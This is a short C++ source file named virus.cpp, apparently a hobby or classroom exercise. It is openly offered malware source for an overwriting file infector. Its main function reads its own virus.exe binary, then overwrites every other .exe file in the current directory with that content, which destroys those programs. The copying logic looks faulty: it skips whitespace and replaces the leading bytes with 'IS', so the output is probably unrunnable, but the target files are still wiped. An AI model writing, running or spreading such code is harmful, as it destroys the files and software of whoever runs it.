// virus.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <filesystem>
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <iterator>

#define EXE_NAME "virus.exe"

namespace fs = std::filesystem;

void changeExeFile(const fs::path exePath, std::string withText) {
	std::filebuf exeFile;
	exeFile.open(exePath, std::ios::binary | std::ios::out);
	if (!exeFile.is_open())
		std::cout << "cannot open" << std::endl;
	exeFile.sputn(withText.c_str(), withText.length());
	exeFile.close();
}

std::string getProgramText(const fs::path exeFilePath) {
	/*std::ifstream fin(exeFilePath, std::ios::binary);
std::string str((std::istream_iterator<char>(fin >> std::skipws)),
	std::istream_iterator<char>());
fin.close();*/

	std::ifstream instream(exeFilePath, std::ios::binary);
	std::string str;
	std::string line;
	while (instream >> line)
	{
		str += line;
		if (instream.peek() == '\n') //detect "\n"
		{
			str += '\n';
		}
	}
	instream.close();

	std::ostringstream oss;
	oss << "IS" << str.substr(2);

	return oss.str();
}

int main()
{
	const fs::path currentDirPath = fs::current_path();
	const fs::path exeFilePath = currentDirPath / EXE_NAME;
	std::string textToWriteInExe = getProgramText(exeFilePath);

	for (const auto& entry : fs::directory_iterator(currentDirPath)) {
		if (entry.is_directory()) continue;
		const fs::path filePath = entry.path();
		if (filePath == exeFilePath) continue;
		if (filePath.extension() == ".exe") {
			std::cout << "File: " << filePath << std::endl;
			changeExeFile(filePath, textToWriteInExe);
		}
	}

	system("pause");
}
